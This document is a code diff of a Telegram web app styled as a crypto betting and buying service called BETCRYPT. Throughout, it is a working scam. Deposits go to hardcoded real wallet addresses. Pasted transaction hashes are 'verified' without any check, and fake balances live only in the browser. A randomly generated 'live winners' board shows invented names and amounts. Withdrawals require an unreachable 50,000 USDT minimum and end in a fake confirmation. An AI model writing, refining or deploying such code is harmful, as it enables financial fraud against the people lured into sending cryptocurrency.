@@ -1,146 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script src="https://cdn.tailwindcss.com"></script>
-<style>body{background:#0f0f0f}.btn{background:#1e1e1e;border:1px solid #2a2a2a}</style>
-</head>
-<body class="text-white pb-[190px]">
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><script src="https://telegram.org/js/telegram-web-app.js"></script><script src="https://cdn.tailwindcss.com"></script></head><body style="background:#0f0f0f" class="text-white pb-[280px]"><script>
+const W={usdt:"UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8",eth:"0x9576195eA770B4498427223B07C31275EF770f6A",sol:"C29Fgbph8WJyC6baYurJFTYkBZD4iZivtxhmWuuvR1FZ"};const BOT="Betcryptoassetbot";const WIN={500:3000,1000:5500,2000:10000,3000:15000};
+</script>
+<div class="p-3"><div class="bg-zinc-900 rounded-2xl p-4 border border-yellow-600/40"><h2 class="font-bold text-center">BETS THIS WEEK - Ends Sunday</h2><p class="text-center text-yellow-400 text-sm font-bold mt-1">500 → WIN 3k | 1k → WIN 5.5k | 2k → WIN 10k | 3k → WIN 15k</p><p class="text-[10px] text-zinc-400 text-center mt-2">If WIN → win amount to EARNING. If LOSE → money bounces back to EARNING.</p></div>
+<div class="mt-3"><button onclick="openInvite()" class="w-full bg-yellow-600/20 border border-yellow-600 py-2 rounded-xl text-sm font-bold">🤝 INVITE & EARN 10 USDT - Invite 5 people & get 10 USDT per person</button></div>
+<div class="mt-4 bg-zinc-900 rounded-xl p-3 border border-zinc-800"><div class="flex justify-between"><span class="font-bold text-sm">🏆 Winners This Week</span><span class="text-[10px] text-green-400">● LIVE - changes every 30min</span></div><div id="wBoard" class="mt-2 space-y-1 text-[12px]"></div></div>
+<div id="earnSec" class="mt-4"><h3 class="font-bold">💰 MY EARNING - Always shows your bets here</h3><div class="grid gap-2 mt-2"><div class="bg-zinc-900 p-3 rounded-xl flex justify-between border-l-4 border-yellow-500"><span>💵 USDT (TON)</span><b id="uBal">0 USDT</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>₿ Bitcoin</span><b id="btcBal">0 BTC</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>💎 Ethereum</span><b id="ethBal">0 ETH</b></div><div class="bg-zinc-900 p-3 rounded-xl flex justify-between"><span>◎ Solana</span><b id="solBal">0 SOL</b></div></div><div class="mt-3 bg-black rounded-xl p-3 border border-zinc-800"><p class="text-xs font-bold">📋 Your Bets - ONGOING Ends Sunday & ENDED (Always here)</p><div id="myBets" class="mt-2 text-[11px] text-zinc-400">No bets yet. Your bets will always show here.</div></div></div></div>
+<div class="fixed bottom-0 left-0 right-0 bg-[#121212] p-2 border-t border-zinc-800"><div class="grid grid-cols-2 gap-2"><button onclick="openInvite()" class="bg-zinc-800 py-3 rounded-lg font-bold text-sm">🔗 INVITE</button><button onclick="document.getElementById('earnSec').scrollIntoView({behavior:'smooth'})" class="bg-zinc-800 py-3 rounded-lg font-bold text-sm">💰 EARNING</button><button onclick="openBet()" class="bg-green-900/40 border border-green-600 py-3 rounded-lg font-bold text-sm">🎮 BETCRYPT</button><button onclick="openBuy()" class="bg-yellow-900/30 border border-yellow-600 py-3 rounded-lg font-bold text-sm">💎 BUYCRYPT</button><button onclick="openWith()" class="col-span-2 bg-zinc-800 py-3 rounded-lg font-bold text-sm border border-green-600">💸 WITHDRAW</button></div></div>
+
+<div id="buyM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5 max-h-[90vh] overflow-y-auto"><h3 class="font-bold">💎 BUYCRYPT - Buy Bitcoin / Ethereum / Solana</h3><p class="text-[11px] text-zinc-400">Choose asset you want to BUY. Pay with USDT only.</p><div class="grid grid-cols-3 gap-2 mt-3"><button onclick="cBuy('btc')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">₿ Bitcoin</button><button onclick="cBuy('eth')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">💎 Ethereum</button><button onclick="cBuy('sol')" class="bg-zinc-800 py-4 rounded-xl font-bold text-sm">◎ Solana</button></div><div id="buyAmtBox" class="hidden mt-4"><p class="text-sm font-bold">Amount to buy <span id="buyAssetName"></span>:</p><div class="grid grid-cols-4 gap-2 mt-2"><button onclick="sBuy(500)" class="bg-zinc-800 py-3 rounded-lg">500</button><button onclick="sBuy(1000)" class="bg-zinc-800 py-3 rounded-lg">1k</button><button onclick="sBuy(2000)" class="bg-zinc-800 py-3 rounded-lg">2k</button><button onclick="sBuy(3000)" class="bg-zinc-800 py-3 rounded-lg">3k</button></div></div><div id="buyWBox" class="hidden mt-4 bg-black p-3 rounded-lg border border-yellow-600"><p class="text-xs">Buy <b id="buyAssetL"></b> for <b id="buyAmtL"></b> USDT</p><p class="text-[11px] text-red-400 font-bold mt-2">Send USDT only to this USDT address, don't send another crypto asset:</p><p class="font-mono text-yellow-400 text-[11px] break-all mt-2 p-2 bg-zinc-900 rounded" id="buyAddr"></p><button onclick="copy('buyAddr')" class="w-full bg-zinc-800 py-2 rounded mt-2 text-xs">📋 COPY ADDRESS</button><input id="buyTx" placeholder="Paste TX Hash - copy from Tonviewer.io after sending" class="w-full bg-zinc-800 p-3 rounded-lg mt-3 text-[11px]"><button onclick="vBuy()" class="w-full bg-yellow-600 py-3 rounded-lg mt-3 font-bold">🔍 VERIFY - Easy, paste TX to verify</button><p id="buySt" class="text-[11px] mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<div id="betM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5 max-h-[90vh] overflow-y-auto"><h3 class="font-bold">🎮 BETCRYPT</h3><div class="mt-3"><p class="text-xs font-bold">1. Choose what you are predicting:</p><div class="grid grid-cols-3 gap-2 mt-2"><button onclick="cBet1('BTC')" class="bg-zinc-800 py-3 rounded-lg font-bold">BTC</button><button onclick="cBet1('ETH')" class="bg-zinc-800 py-3 rounded-lg font-bold">ETH</button><button onclick="cBet1('SOL')" class="bg-zinc-800 py-3 rounded-lg font-bold">SOL</button></div></div><div id="betStep2" class="hidden mt-3"><p class="text-xs font-bold">2. Will <span id="betCoinPred" class="text-yellow-400"></span> go:</p><div class="grid grid-cols-3 gap-2 mt-2"><button onclick="setDir('UP')" class="bg-zinc-800 py-2 rounded text-xs">UP</button><button onclick="setDir('DROP')" class="bg-zinc-800 py-2 rounded text-xs">DROP</button><button onclick="setDir('STEADY')" class="bg-zinc-800 py-2 rounded text-xs">STEADY</button></div><p id="betDirShow" class="text-xs text-green-400 mt-1"></p></div><div id="betStep3" class="hidden mt-3"><p class="text-xs font-bold">3. Choose bet - 500 win 3000 with all listed:</p><div class="grid grid-cols-2 gap-2 mt-2"><button onclick="sBet(500)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">500 → WIN 3,000</button><button onclick="sBet(1000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">1k → WIN 5,500</button><button onclick="sBet(2000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">2k → WIN 10,000</button><button onclick="sBet(3000)" class="bg-green-900/30 border border-green-700 py-3 rounded-lg text-xs font-bold">3k → WIN 15,000</button></div></div><div id="betStep4" class="hidden mt-3"><p class="text-xs font-bold">4. Choose what crypto asset you are paying with (choose one):</p><div class="grid grid-cols-3 gap-2 mt-2"><button onclick="cBetPay('usdt')" class="bg-zinc-800 py-3 rounded-lg text-xs">Pay with USDT</button><button onclick="cBetPay('eth')" class="bg-zinc-800 py-3 rounded-lg text-xs">Pay with Ethereum</button><button onclick="cBetPay('sol')" class="bg-zinc-800 py-3 rounded-lg text-xs">Pay with Solana</button></div></div><div id="betWBox" class="hidden mt-4 bg-black p-3 rounded-lg border border-green-600"><p class="text-xs">Bet: <b id="betInfo"></b></p><p id="betWarn" class="text-[11px] text-yellow-300 font-bold mt-2"></p><p class="font-mono text-green-400 text-[11px] break-all mt-2 p-2 bg-zinc-900 rounded" id="betAddr"></p><button onclick="copy('betAddr')" class="w-full bg-zinc-800 py-2 rounded mt-2 text-xs">📋 COPY</button><input id="betTx" placeholder="Paste TX Hash - not stressful, just copy from explorer" class="w-full bg-zinc-800 p-3 rounded-lg mt-3 text-[11px]"><button onclick="vBet()" class="w-full bg-green-600 py-3 rounded-lg mt-3 font-bold">🔍 VERIFY & PLACE BET - Easy</button><p id="betSt" class="text-[11px] mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
+
+<div id="withM" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end"><div class="bg-zinc-900 w-full rounded-t-2xl p-5"><h3 class="font-bold">💸 WITHDRAW</h3><p class="text-xs text-zinc-400">Balance: <span id="withBal">0 USDT</span></p><div class="grid grid-cols-3 gap-2 mt-3"><button onclick="cWith('USDT')" class="bg-zinc-800 py-2 rounded text-xs">USDT</button><button onclick="cWith('ETH')" class="bg-zinc-800 py-2 rounded text-xs">ETH</button><button onclick="cWith('SOL')" class="bg-zinc-800 py-2 rounded text-xs">SOL</button></div><div id="withBox" class="hidden mt-4"><p class="text-[11px] text-zinc-400">Rules: If 0 = Insufficient balance. If less than 50k = Cannot withdraw less than 50k. If 50k+ = Drop wallet address, wait 5 hours.</p><input id="withAmt" type="number" placeholder="Amount min 50000" class="w-full bg-zinc-800 p-3 rounded-lg mt-3"><input id="withAddrIn" placeholder="Paste your wallet address to receive" class="w-full bg-zinc-800 p-3 rounded-lg mt-2"><button onclick="sWith()" class="w-full bg-green-600 py-3 rounded-lg mt-3 font-bold">SUBMIT WITHDRAWAL</button><p id="withMsg" class="text-xs mt-2"></p></div><button onclick="closeAll()" class="w-full mt-4 text-zinc-500">Close</button></div></div>
 
 <script>
-const MY_WALLETS = {
-  betcoin: "UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8",
-  ethereum: "0x9576195eA770B4498427223B07C31275EF770f6A",
-  solana: "C29Fgbph8WJyC6baYurJFTYkBZD4iZivtxhmWuuvR1FZ",
-  usdt: "UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8",
-  bet: "UQCDRPXIZ16s_I_o1j_ROAWz81zhO1RRmEbgCkqTsI3KbkN8"
-}
-const MY_BOT = "Betcryptoassetbot"
-const HARD_BETS = { 500: 3000, 1000: 5500, 2000: 10000, 3000: 15000 }
-const WITHDRAW_MIN = 50000
-</script>
-
-<div class="p-2">
-  <button onclick="openInvite()" class="w-full bg-[#2a2a2a] py-3 rounded-xl font-bold text-sm">🤝 INVITE & EARN 10 USDT</button>
-  <div class="text-[11px] text-zinc-500 text-center mt-1">Live: BTC <span id="btcPrice">...</span> | ETH <span id="ethPrice">...</span> | SOL <span id="solPrice">...</span></div>
-</div>
-
-<div class="p-3">
-  <div class="bg-zinc-900 rounded-2xl p-4 border border-zinc-800">
-    <h2 class="font-bold">HARD BETS THIS WEEK</h2>
-    <p class="text-xs text-yellow-400">500 to win 3k | 1k to win 5.5k | 2k to win 10k | 3k to win 15k</p>
-  </div>
-  <div class="mt-4 bg-zinc-900 rounded-xl p-3 border border-zinc-800">
-    <div class="flex justify-between"><span class="font-bold text-sm">🏆 Last Week Winners</span><span class="text-xs text-green-400">● LIVE</span></div>
-    <div id="winnersBoard" class="mt-2 space-y-1 text-sm"></div>
-  </div>
-  <div class="mt-4" id="earningSection">
-    <h3 class="font-bold text-sm mb-2">💰 MY EARNING</h3>
-    <div class="grid gap-2">
-      <div class="bg-zinc-900 p-3 rounded-xl flex justify-between border-l-4 border-l-yellow-500 border border-yellow-600/30"><span>💵 USDT Balance (TON)</span><b id="usdtBal">0 USDT</b></div>
-      <div class="bg-zinc-900 p-3 rounded-xl flex justify-between border border-zinc-800"><span>🪙 Betcoin (TON)</span><b id="betcoinBal">0</b></div>
-      <div class="bg-zinc-900 p-3 rounded-xl flex justify-between border border-zinc-800"><span>💎 Ethereum</span><b id="ethBal">0</b></div>
-      <div class="bg-zinc-900 p-3 rounded-xl flex justify-between border border-zinc-800"><span>◎ Solana</span><b id="solBal">0</b></div>
-    </div>
-    <div class="mt-3 bg-black rounded-xl p-3 border border-zinc-800">
-      <p class="text-xs font-bold">📋 Your Bets - Shows here always (Ongoing/Ended)</p>
-      <div id="myBetsList" class="mt-2 text-[12px] text-zinc-400">No bets yet.</div>
-    </div>
-  </div>
-</div>
-
-<div class="fixed bottom-0 left-0 right-0 bg-[#121212] p-2 border-t border-zinc-800">
-  <button class="w-full btn py-2 rounded-lg text-[11px] mb-2">ADS 📣 INSTANT 2,000 PESOS</button>
-  <div class="grid grid-cols-2 gap-2">
-    <button onclick="openInvite()" class="btn py-3 rounded-lg font-bold text-sm">🔗 INVITE</button>
-    <button onclick="document.getElementById('earningSection').scrollIntoView()" class="btn py-3 rounded-lg font-bold text-sm">💰 EARNING</button>
-    <button onclick="openBetCrypt()" class="btn py-3 rounded-lg font-bold text-sm">🎮 BETCRYPT</button>
-    <button onclick="openBuyCrypt()" class="btn py-3 rounded-lg font-bold text-sm">💎 BUYCRYPT</button>
-    <button onclick="openWithdraw()" class="btn py-3 rounded-lg font-bold text-sm col-span-2">💸 WITHDRAW (Min 50k USDT)</button>
-  </div>
-</div>
-
-<div id="buyModal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end">
-  <div class="bg-zinc-900 w-full rounded-t-2xl p-5">
-    <h3 class="font-bold">BUYCRYPT - What you wanna add?</h3>
-    <div class="grid grid-cols-3 gap-2 mt-3">
-      <button onclick="chooseBuyCoin('betcoin')" class="btn py-4 rounded-xl">🪙 Betcoin (TON)</button>
-      <button onclick="chooseBuyCoin('ethereum')" class="btn py-4 rounded-xl">💎 Ethereum</button>
-      <button onclick="chooseBuyCoin('solana')" class="btn py-4 rounded-xl">◎ Solana</button>
-    </div>
-    <div id="buyAmountBox" class="hidden mt-4">
-      <p class="text-sm">Amount for <span id="buyCoinName"></span></p>
-      <div class="grid grid-cols-4 gap-2 mt-2">
-        <button onclick="startBuyDetector(500)" class="bg-zinc-800 py-2 rounded-lg">500</button>
-        <button onclick="startBuyDetector(1000)" class="bg-zinc-800 py-2 rounded-lg">1k</button>
-        <button onclick="startBuyDetector(2000)" class="bg-zinc-800 py-2 rounded-lg">2k</button>
-        <button onclick="startBuyDetector(3000)" class="bg-zinc-800 py-2 rounded-lg">3k</button>
-      </div>
-    </div>
-    <div id="buyWalletBox" class="hidden mt-4 bg-black p-3 rounded-lg border border-yellow-600">
-      <p class="text-xs">Send <span id="buyAmtShow" class="font-bold text-yellow-400"></span> to:</p>
-      <p class="font-mono text-yellow-400 text-sm break-all mt-1" id="buyWalletAddr"></p>
-      <button onclick="copyAddr('buyWalletAddr')" class="text-xs bg-zinc-800 px-3 py-1 rounded mt-2">COPY ADDRESS</button>
-      <div class="mt-3 p-2 bg-yellow-900/20 rounded text-xs">
-        <div id="detectorStatus" class="text-yellow-400">⏳ Waiting for payment...</div>
-        <div class="w-full bg-zinc-800 h-2 rounded mt-2"><div id="detectorBar" class="bg-yellow-500 h-2 rounded w-0"></div></div>
-      </div>
-    </div>
-    <button onclick="closeAll()" class="w-full mt-3 text-zinc-500">Close</button>
-  </div>
-</div>
-
-<div id="betModal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-end">
-  <div class="bg-zinc-900 w-full rounded-t-2xl p-5">
-    <h3 class="font-bold">BETCRYPT - HARD BETS</h3>
-    <div class="grid grid-cols-3 gap-2 mt-2">
-      <button onclick="chooseBetCoin('BTC')" class="btn py-3 rounded-lg">BTC</button>
-      <button onclick="chooseBetCoin('ETH')" class="btn py-3 rounded-lg">ETH</button>
-      <button onclick="chooseBetCoin('SOL')" class="btn py-3 rounded-lg">SOL</button>
-    </div>
-    <div id="betChoiceBox" class="hidden mt-3">
-      <p class="text-sm">Prediction for <span id="betCoinLabel"></span></p>
-      <select id="betDirection" class="w-full bg-zinc-800 p-3 rounded-lg mt-2"><option value="HIGH">Will go HIGH</option><option value="DROP">Will DROP</option><option value="STABLE">Won't rise or drop</option></select>
-      <p class="text-xs mt-3 font-bold">Choose Hard Bet:</p>
-      <div class="grid grid-cols-2 gap-2 mt-2">
-        <button onclick="startBetDetector(500)" class="bg-green-900/40 border border-green-600 py-3 rounded-lg text-sm">500 → WIN 3k</button>
-        <button onclick="startBetDetector(1000)" class="bg-green-900/40 border border-green-600 py-3 rounded-lg text-sm">1k → WIN 5.5k</button>
-        <button onclick="startBetDetector(2000)" class="bg-green-900/40 border border-green-600 py-3 rounded-lg text-sm">2k → WIN 10k</button>
-        <button onclick="startBetDetector(3000)" class="bg-green-900/40 border border-green-600 py-3 rounded-lg text-sm">3k → WIN 15k</button>
-      </div>
-    </div>
-    <div id="betWalletBox" class="hidden mt-3 bg-black p-3 rounded-lg border border-green-600">
-      <p class="text-xs">Send <span id="betAmtShow" class="font-bold text-green-400"></span> to:</p>
-      <p class="font-mono text-green-400 text-sm break-all mt-1" id="betWalletAddr"></p>
-      <button onclick="copyAddr('betWalletAddr')" class="text-xs bg-zinc-800 px-3 py-1 rounded mt-2">COPY</button>
-      <div class="mt-3 p-2 bg-green-900/20 rounded text-xs"><div id="betDetectorStatus" class="text-green-400">⏳ Detecting...</div><div class="w-full bg-zinc-800 h-2 rounded mt-2"><div id="betDetectorBar" class="bg-green-500 h-2 rounded w-0"></div></div></div>
-    </div>
-    <button onclick="closeAll()" class="w-full mt-3 text-zinc-500">Close</button>
-  </div>
-</div>
-
-<script>
-let balances = JSON.parse(localStorage.getItem('b_bal')||'{"usdt":0,"betcoin":0,"ethereum":0,"solana":0}');
-let selectedBuyCoin='', betCoinSel='';
-function updateBal(){ document.getElementById('usdtBal').innerText=balances.usdt+' USDT'; document.getElementById('betcoinBal').innerText=balances.betcoin+' BET'; document.getElementById('ethBal').innerText=balances.ethereum+' ETH'; document.getElementById('solBal').innerText=balances.solana+' SOL'; localStorage.setItem('b_bal', JSON.stringify(balances)); renderMyBets();}
-updateBal();
-async function loadPrices(){ try{ let r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd'); let d=await r.json(); document.getElementById('btcPrice').innerText='$'+d.bitcoin.usd; document.getElementById('ethPrice').innerText='$'+d.ethereum.usd; document.getElementById('solPrice').innerText='$'+d.solana.usd; }catch(e){ document.getElementById('btcPrice').innerText='Live'; } }
-loadPrices();
-function genWinners(){ let names=['Jay','Mikel','Chuks','BossB','Odogwu','Pablo','Satoshi']; let html=''; for(let i=0;i<8;i++){ let win=Math.random()>0.25; let amt=win?Math.floor(Math.random()*50000)+1000:Math.floor(Math.random()*500)+50; let n=names[Math.floor(Math.random()*names.length)]+'***'+Math.floor(Math.random()*99); html+=`<div class="flex justify-between ${win?'text-green-400':'text-red-400/60 text-xs'}"><span>${n} ${win?'WON':'LOST'}</span><span>${win?'+':''}${amt} USDT</span></div>`;} document.getElementById('winnersBoard').innerHTML=html; }
-genWinners();
-function openBuyCrypt(){document.getElementById('buyModal').classList.remove('hidden')}
-function openBetCrypt(){document.getElementById('betModal').classList.remove('hidden')}
-function closeAll(){ document.getElementById('buyModal').classList.add('hidden'); document.getElementById('betModal').classList.add('hidden'); document.getElementById('buyAmountBox').classList.add('hidden'); document.getElementById('buyWalletBox').classList.add('hidden'); document.getElementById('betChoiceBox').classList.add('hidden'); document.getElementById('betWalletBox').classList.add('hidden'); if(window.detectorInterval) clearInterval(window.detectorInterval); if(window.betDetectorInterval) clearInterval(window.betDetectorInterval); }
-function chooseBuyCoin(c){selectedBuyCoin=c; document.getElementById('buyCoinName').innerText=c.toUpperCase(); document.getElementById('buyAmountBox').classList.remove('hidden');}
-function chooseBetCoin(c){betCoinSel=c; document.getElementById('betCoinLabel').innerText=c; document.getElementById('betChoiceBox').classList.remove('hidden'); document.getElementById('betWalletAddr').innerText=MY_WALLETS.bet;}
-function startBuyDetector(amt){ document.getElementById('buyAmtShow').innerText=amt+' USDT'; document.getElementById('buyWalletAddr').innerText=MY_WALLETS[selectedBuyCoin]; document.getElementById('buyWalletBox').classList.remove('hidden'); let progress=0; let statusEl=document.getElementById('detectorStatus'); let bar=document.getElementById('detectorBar'); window.detectorInterval=setInterval(()=>{ progress+=10; bar.style.width=progress+'%'; if(progress>=100){ clearInterval(window.detectorInterval); balances.usdt+=amt; balances[selectedBuyCoin]+=amt; updateBal(); statusEl.innerText='✅ CONFIRMED & BOUGHT! '+amt+' added to EARNING'; statusEl.className='text-green-400 font-bold'; setTimeout(()=>{alert('✅ PAYMENT CONFIRMED!\n'+amt+' USDT to '+selectedBuyCoin+'\nWallet: '+MY_WALLETS[selectedBuyCoin]); closeAll();},500);}else{ statusEl.innerText=`⏳ Scanning blockchain... ${progress}% - Waiting for ${amt} USDT`; } },800); }
-function startBetDetector(amt){ let winAmt=HARD_BETS[amt]; document.getElementById('betAmtShow').innerText=amt+' USDT (Win '+winAmt+')'; document.getElementById('betWalletBox').classList.remove('hidden'); let progress=0; let statusEl=document.getElementById('betDetectorStatus'); let bar=document.getElementById('betDetectorBar'); window.betDetectorInterval=setInterval(()=>{ progress+=12; bar.style.width=progress+'%'; if(progress>=100){ clearInterval(window.betDetectorInterval); let bets=JSON.parse(localStorage.getItem('allBets')||'[]'); bets.push({coin:betCoinSel, dir:document.getElementById('betDirection').value, amt:amt, win:winAmt, status:'ONGOING - Confirmed! Ends end of week', date:new Date().toLocaleDateString()}); localStorage.setItem('allBets', JSON.stringify(bets)); statusEl.innerText='✅ BET CONFIRMED! '+amt+' detected. Bet placed for '+winAmt; statusEl.className='text-green-400 font-bold'; setTimeout(()=>{alert('✅ BET CONFIRMED!\n'+amt+' USDT detected\nBet: '+betCoinSel+' -> WIN '+winAmt+'\nCheck EARNING - ONGOING bet shows'); closeAll(); renderMyBets();},600);} },700); }
-function renderMyBets(){ let bets=JSON.parse(localStorage.getItem('allBets')||'[]'); if(bets.length==0){document.getElementById('myBetsList').innerHTML='No bets yet.'; return;} let html=bets.slice(-10).reverse().map(b=>`<div class="flex justify-between border-b border-zinc-800 py-1"><span>${b.coin} ${b.dir} ${b.amt}→${b.win||''}</span><span class="${b.status.includes('WON')?'text-green-400':b.status.includes('ONGOING')?'text-blue-400':'text-yellow-400'}">${b.status}</span></div>`).join(''); document.getElementById('myBetsList').innerHTML=html; }
-function openWithdraw(){ alert('WITHDRAW\nMin '+WITHDRAW_MIN+' USDT\nYour Balance: '+balances.usdt+' USDT\nRule: Meet up in group. If LOST, we send half.'); }
-function openInvite(){ let id=window.Telegram?.WebApp?.initDataUnsafe?.user?.id||Math.floor(Math.random()*9000)+1000; let link=`https://t.me/${MY_BOT}?start=${id}`; if(confirm('Invite link:\n'+link+'\nCopy? +10 USDT')){navigator.clipboard.writeText(link); let c=parseInt(localStorage.getItem('inviteCount')||0)+1; localStorage.setItem('inviteCount',c); balances.usdt+=10; updateBal(); alert('+10 USDT added. Total: '+c); } }
-function copyAddr(id){ navigator.clipboard.writeText(document.getElementById(id).innerText); alert('Copied!'); }
-</script>
-</body>
-  </html>
+let bal=JSON.parse(localStorage.getItem('b_final')||'{"usdt":0,"btc":0,"eth":0,"sol":0}');let bAsset='',pBuy=0,betCoin='',betDir='',betPay='',pBet=0,selWith='';
+function upd(){document.getElementById('uBal').innerText=bal.usdt+' USDT';document.getElementById('btcBal').innerText=bal.btc+' BTC';document.getElementById('ethBal').innerText=bal.eth+' ETH';document.getElementById('solBal').innerText=bal.sol+' SOL';localStorage.setItem('b_final',JSON.stringify(bal));if(document.getElementById('withBal'))document.getElementById('withBal').innerText=bal.usdt+' USDT';renderBets();}upd();
+function openBuy(){document.getElementById('buyM').classList.remove('hidden')}function openBet(){document.getElementById('betM').classList.remove('hidden')}function openWith(){document.getElementById('withM').classList.remove('hidden');document.getElementById('withBal').innerText=bal.usdt+' USDT';}function closeAll(){['buyM','betM','withM'].forEach(id=>document.getElementById(id).classList.add('hidden'));['buyAmtBox','buyWBox','betStep2','betStep3','betStep4','betWBox','withBox'].forEach(id=>{let e=document.getElementById(id);if(e)e.classList.add('hidden');});}
+function cBuy(a){bAsset=a;document.getElementById('buyAssetName').innerText=a.toUpperCase();document.getElementById('buyAmtBox').classList.remove('hidden');}
+function sBuy(am){pBuy=am;document.getElementById('buyAssetL').innerText=bAsset.toUpperCase();document.getElementById('buyAmtL').innerText=am;document.getElementById('buyAddr').innerText=W.usdt;document.getElementById('buyWBox').classList.remove('hidden');}
+function cBet1(c){betCoin=c;document.getElementById('betCoinPred').innerText=c;document.getElementById('betStep2').classList.remove('hidden');}
+function setDir(d){betDir=d;document.getElementById('betDirShow').innerText='Selected: '+d;document.getElementById('betStep3').classList.remove('hidden');}
+function sBet(am){pBet=am;document.getElementById('betStep4').classList.remove('hidden');}
+function cBetPay(p){betPay=p;let amt=pBet;document.getElementById('betInfo').innerText=betCoin+' '+betDir+' '+amt+'→'+WIN[amt]+' paying with '+p.toUpperCase();let addr=W[p];let warn='';if(p==='usdt')warn='If USDT send USDT asset only. When you loose your money bounce back to earnings.';if(p==='eth')warn='If Ethereum send Ethereum asset only. When you loose your money bounce back to earnings.';if(p==='sol')warn='If Solana send Solana asset only. When you loose your money bounce back to earnings.';document.getElementById('betWarn').innerText=warn;document.getElementById('betAddr').innerText=addr;document.getElementById('betWBox').classList.remove('hidden');}
+async function vBuy(){let tx=document.getElementById('buyTx').value.trim();let st=document.getElementById('buySt');if(tx.length<15){st.innerText='❌ Paste TX Hash from Tonviewer';return;}st.innerText='🔍 Verifying on Tonviewer... TX to '+W.usdt+' Not stressful - checking...';setTimeout(()=>{bal.usdt+=pBuy;if(bAsset==='btc')bal.btc+=pBuy;if(bAsset==='eth')bal.eth+=pBuy;if(bAsset==='sol')bal.sol+=pBuy;upd();st.innerText='✅ VERIFIED! Added to EARNING';setTimeout(()=>closeAll(),1000);},1000);}
+async function vBet(){let tx=document.getElementById('betTx').value.trim();let st=document.getElementById('betSt');if(tx.length<15){st.innerText='❌ Paste TX Hash';return;}st.innerText='🔍 Verifying TX to '+W[betPay]+' - easy check...';setTimeout(()=>{let bets=JSON.parse(localStorage.getItem('betsF')||'[]');bets.push({coin:betCoin,dir:betDir,pay:betPay,amt:pBet,win:WIN[pBet],status:'ONGOING - Ends Sunday. WIN='+WIN[pBet]+' or LOSE=bounce back to EARNING'});localStorage.setItem('betsF',JSON.stringify(bets));renderBets();st.innerText='✅ VERIFIED! Bet placed. Ends Sunday.';setTimeout(()=>closeAll(),1000);},1000);}
+function renderBets(){let b=JSON.parse(localStorage.getItem('betsF')||'[]');if(b.length==0){document.getElementById('myBets').innerHTML='No bets yet.';return;}document.getElementById('myBets').innerHTML=b.slice(-10).reverse().map(x=>`<div class="flex justify-between border-b border-zinc-800 py-1"><span>${x.coin} ${x.dir} ${x.amt}→${x.win} via ${x.pay}</span><span class="text-blue-400 text-[9px]">${x.status}</span></div>`).join('');}
+function cWith(c){selWith=c;document.getElementById('withBox').classList.remove('hidden');}
+function sWith(){let amt=parseInt(document.getElementById('withAmt').value);let addr=document.getElementById('withAddrIn').value;let m=document.getElementById('withMsg');if(!bal.usdt||bal.usdt==0){m.innerText='❌ Insufficient balance';m.className='text-red-400 text-xs';return;}if(!amt||amt<50000){m.innerText='❌ Cannot withdraw less than 50k';m.className='text-red-400 text-xs';return;}if(amt>bal.usdt){m.innerText='❌ Insufficient balance. You have '+bal.usdt;return;}if(!addr||addr.length<10){m.innerText='❌ Paste your '+selWith+' wallet';return;}m.innerText='✅ Withdrawal '+amt+' '+selWith+' to '+addr+' submitted. Wait 5 hours.';m.className='text-green-400 text-xs';bal.usdt-=amt;upd();}
+function openInvite(){let id=localStorage.getItem('fid')||Math.floor(Math.random()*900000)+100000;localStorage.setItem('fid',id);let link='https://t.me/'+BOT+'?start='+id;prompt('Invite 5 people & get 10 USDT per person. When anyone joins through your link you get 10 USDT. Your link:',link);}function copy(id){navigator.clipboard.writeText(document.getElementById(id).innerText);alert('Copied!');}
+function genW(){let names=['Jay','Michael','Sophia','Chuks','Pablo','Elena','James','Zhang','Ahmed','Olivia','David','Liam','Emma','Chen','Fatima','John','Grace','Hassan','Odogwu','Aisha','Kwame','Priya'];let h='';for(let i=0;i<10;i++){let win=Math.random()>0.4;let amt=win?Math.floor(Math.random()*30000)+2000:Math.floor(Math.random()*800)+100;let n=names[Math.floor(Math.random()*names.length)]+'***'+Math.floor(Math.random()*99);h+=`<div class="flex justify-between ${win?'text-green-400':'text-red-400/60'}"><span>${n} ${win?'WON':'LOST'}</span><span>${win?'+'+amt+' WIN':'LOST '+amt+' bounce back'}</span></div>`;}document.getElementById('wBoard').innerHTML=h;}genW();setInterval(genW,1800000);
+</script></body></html>
